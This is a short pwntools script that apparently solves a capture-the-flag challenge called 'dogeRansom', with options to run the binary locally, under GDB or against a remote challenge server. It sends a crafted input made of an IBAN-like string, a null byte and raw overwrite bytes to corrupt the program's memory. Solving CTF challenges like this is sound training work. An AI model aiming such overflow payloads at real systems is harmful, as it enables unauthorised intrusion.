from pwn import *


elf = context.binary = ELF('./dogeRansom')
context.terminal = ()
if args.REMOTE:
    p = remote('dogeransom.challs.olicyber.it', 10804)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript='''
        b *createTransaction+215
        c
        b updateTransaction
        c
    ''')
else:
    p = elf.process()


p.sendlineafter(b'> ',b'1')
p.sendlineafter(b': ',b'4000')
p.sendlineafter(b': ',b'IT70S0501811800000012284030\0\xff\xff\x77\x77\x77\xee\xee\x77\xee\x77\x77\x77\x77\xff\xff\xff\xff\xff\xff\xff\x03\x03\x03\x03\x03')
p.interactive()